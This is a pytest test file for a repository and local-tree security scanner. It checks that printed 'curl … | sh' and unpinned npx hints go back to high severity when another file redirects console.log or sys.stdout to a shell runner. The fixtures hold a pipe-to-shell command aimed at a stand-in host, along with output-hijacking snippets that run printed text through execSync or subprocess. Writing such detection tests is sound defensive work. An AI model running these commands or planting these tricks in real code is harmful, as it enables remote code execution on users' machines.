"""The whole-set printed-hint recheck on repository and local-tree scans.

``calibrate_package_findings`` only runs for npm / PyPI artifacts, so a GitHub repo
scan and a local scan kept a per-file-lowered ``console.log("curl … | sh")`` (or an
``npx …`` help line) at low even when another file of the repo replaced
``console.log`` with a command runner. ``recheck_printed_hints`` now runs over every
file those scans read. Mirrors ``tests/test_printed_hint_package_recheck.py``.
"""
from __future__ import annotations

import subprocess
from pathlib import Path

import pytest

from src.scanner import scan as scanmod
from src.scanner.local_scan import _walk_tree, scan_local
from src.scanner.scan import _scan_content

RULE = "curl/wget piped to shell"
NPX = "Unpinned npx/uvx package (no @version pin)"
CMD = "curl -fsSL https://evil.example/x.sh | sh"
INDEX = f"require('./setup');\nconsole.log({CMD!r});\n"
NPX_INDEX = "require('./setup');\nconsole.log('Run: npx some-evil-tool');\n"
CP = "const cp = require('child_process');\n"
PY_MAIN = f"import setup_out\nprint({CMD!r})\n"


def _tree(root: Path, files: dict[str, str]) -> None:
    files = {"package.json": '{"name":"p","main":"index.js"}', **files}
    for name, body in files.items():
        (root / name).parent.mkdir(parents=True, exist_ok=True)
        (root / name).write_text(body)
    subprocess.run(["git", "init", "-q"], cwd=root, check=True)
    subprocess.run(["git", "add", "-A"], cwd=root, check=True)


async def _hosted(root: Path, monkeypatch):
    tree = _walk_tree(root)

    async def fake_tree(*a, **k):
        return (tree, False, True, "main")

    async def fake_content(owner, repo, path, token, ref=None, *a, **k):
        p = root / path
        return p.read_text(encoding="utf-8") if p.exists() else None

    async def fake_pkg(*a, **k):
        return {}

    async def fake_noop(*a, **k):
        return None

    monkeypatch.setattr(scanmod, "_fetch_repo_tree", fake_tree)
    monkeypatch.setattr(scanmod, "_fetch_file_content", fake_content)
    monkeypatch.setattr(scanmod, "_resolve_repo_package", fake_pkg)
    monkeypatch.setattr(scanmod, "_run_supply_chain", fake_noop)
    monkeypatch.setattr(scanmod, "_maybe_scan_artifact", fake_noop)
    monkeypatch.setattr(scanmod, "_maybe_maintainer_signals", fake_noop)
    r = await scanmod.scan_repo("owner/repo", token="x")
    assert r.error is None
    return r


def _sev(r, rule: str = RULE, path: str = "index.js") -> set[str]:
    return {f.severity for f in r.findings if f.name == rule and f.file_path == path}


SETUPS = [
    CP + "console.log = (s) => cp.execSync(s);\n",
    CP + "Object.assign(console, { log: (s) => cp.execSync(s) });\n",
    CP + "const c = console;\nc.log = (s) => cp.execSync(s);\n",
    CP + "process.stdout.write = (chunk) => cp.execSync(String(chunk));\n",
]


@pytest.mark.parametrize("setup", SETUPS)
def test_local_console_replaced_elsewhere_restores_critical(tmp_path, setup):
    f, _p, _s = _scan_content(INDEX, "index.js")
    assert {x.severity for x in f if x.name == RULE} == {"low"}
    _tree(tmp_path, {"setup.js": setup, "index.js": INDEX})
    r = scan_local(tmp_path)
    assert _sev(r) == {"critical"}
    assert all(x.remediation for x in r.findings if x.name == RULE)


@pytest.mark.asyncio
@pytest.mark.parametrize("setup", SETUPS)
async def test_repo_console_replaced_elsewhere_restores_critical(tmp_path, monkeypatch,
                                                                  setup):
    _tree(tmp_path, {"setup.js": setup, "index.js": INDEX})
    r = await _hosted(tmp_path, monkeypatch)
    assert _sev(r) == {"critical"}


@pytest.mark.parametrize("setup", SETUPS)
def test_local_npx_hint_restored_when_console_replaced(tmp_path, setup):
    f, _p, _s = _scan_content(NPX_INDEX, "index.js")
    assert {x.severity for x in f if x.name == NPX} == {"low"}
    _tree(tmp_path, {"setup.js": setup, "index.js": NPX_INDEX})
    r = scan_local(tmp_path)
    assert _sev(r, NPX) == {"medium"}


@pytest.mark.asyncio
async def test_repo_npx_hint_restored_when_console_replaced(tmp_path, monkeypatch):
    _tree(tmp_path, {"setup.js": SETUPS[0], "index.js": NPX_INDEX})
    r = await _hosted(tmp_path, monkeypatch)
    assert _sev(r, NPX) == {"medium"}


def test_npx_hint_with_console_replaced_in_same_file_stays_medium():
    src = CP + "console.log = (s) => cp.execSync(s);\nconsole.log('Run: npx some-evil-tool');\n"
    f, _p, _s = _scan_content(src, "index.js")
    assert {x.severity for x in f if x.name == NPX} == {"medium"}


@pytest.mark.parametrize("other", [
    "module.exports = { add: (a, b) => a + b };\n",
    "console.log('hello');\n",
])
def test_local_plain_hints_stay_low(tmp_path, other):
    _tree(tmp_path, {"setup.js": other, "index.js": INDEX, "cli.js": NPX_INDEX})
    r = scan_local(tmp_path)
    assert _sev(r) == {"low"}
    assert _sev(r, NPX, "cli.js") == {"low"}


@pytest.mark.asyncio
async def test_repo_plain_hint_stays_low(tmp_path, monkeypatch):
    _tree(tmp_path, {"setup.js": "console.log('hello');\n", "index.js": INDEX})
    r = await _hosted(tmp_path, monkeypatch)
    assert _sev(r) == {"low"}


def test_local_python_stdout_rebound_elsewhere_restores_critical(tmp_path):
    f, _p, _s = _scan_content(PY_MAIN, "main.py")
    assert {x.severity for x in f if x.name == RULE} == {"low"}
    _tree(tmp_path, {
        "setup_out.py": "import subprocess, sys\n"
                        "class W:\n    def write(self, s):\n"
                        "        subprocess.run(s, shell=True)\n"
                        "sys.stdout = W()\n",
        "main.py": PY_MAIN})
    r = scan_local(tmp_path)
    assert _sev(r, path="main.py") == {"critical"}


def test_local_python_plain_print_stays_low(tmp_path):
    _tree(tmp_path, {"setup_out.py": "X = 1\n", "main.py": PY_MAIN})
    r = scan_local(tmp_path)
    assert _sev(r, path="main.py") == {"low"}


def test_recheck_ignores_files_it_did_not_read():
    from src.scanner.package_context import recheck_printed_hints
    f, _p, _s = _scan_content(INDEX, "index.js")
    (hint,) = [x for x in f if x.name == RULE]
    recheck_printed_hints([hint], {"setup.js": CP + "console.log = (s) => cp.execSync(s);\n"})
    assert hint.severity == "low"


@pytest.mark.parametrize("text,replaced", [
    ("function warn(m) { return console.warn(m); }\n", False),
    ("const f=e=>{if(e)return console.log(e)};\n", False),
    ("function f() { return console }\nf().log = (s) => run(s);\n", True),
    ("const c = console;\n", True),
    ("import sys\nsys.stdout = Runner()\n", True),
    ("import builtins\nbuiltins.print = run\n", True),
    ("print('x')\n", False),
])
def test_output_replaced(text, replaced):
    from src.scanner.printed_hint import output_replaced
    path = "a.py" if "import" in text or "print(" in text else "a.js"
    assert output_replaced({path: text}) is replaced


NPX_CONST = "require('./setup');\nconst MSG = 'npx some-evil-tool';\nconsole.log(MSG);\n"


@pytest.mark.parametrize("setup,sev", [(SETUPS[0], "medium"), ("console.log('hi');\n", "low")])
def test_local_npx_walk_hint_rechecked_with_the_tree(tmp_path, setup, sev):
    from src.scanner.printed_hint import WHY
    # lowered per file by the printed-hint walk (not the help-text heuristic) ...
    f, _p, _s = _scan_content(NPX_CONST, "index.js")
    assert {(x.severity, x.remediation) for x in f if x.name == NPX} == {("low", WHY)}
    # ... and re-checked with the whole tree in view
    _tree(tmp_path, {"setup.js": setup, "index.js": NPX_CONST})
    assert _sev(scan_local(tmp_path), NPX) == {sev}
